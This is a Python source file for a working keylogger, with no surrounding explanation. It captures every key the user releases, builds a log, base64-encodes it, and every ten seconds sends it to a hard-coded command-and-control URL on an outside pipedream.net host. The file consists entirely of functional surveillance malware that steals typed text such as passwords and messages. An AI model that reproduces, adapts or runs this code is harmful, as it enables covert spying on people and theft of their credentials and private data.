import keyboard
from threading import Timer
from base64 import b64encode
import requests
from datetime import datetime

C2_URL = "https://eojq8hwqcmc0vnh.m.pipedream.net"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.start_dt = datetime.now()
        self.log =""

    def send_server(self):
        leaked_bytes = (self.log).encode("ascii")
        leaked_info = b64encode(leaked_bytes)
        res = requests.get(C2_URL,params=(leaked_info))
    
    
    def callback(self, event):
        # key UP is occured
        name = event.name
        if len(name)>1:
            name = name.replace(" ","_")
            name = name.upper()
            name = "[{0}]".format(name)


        
        self.log+=name  
        #print(name)

    def report(self):
        
        # This function gets called every `self.interval`
        if self.log != "":
            self.send_server()

        self.log=""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):

        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":

    keylogger = Keylogger(interval=10)
    keylogger.start()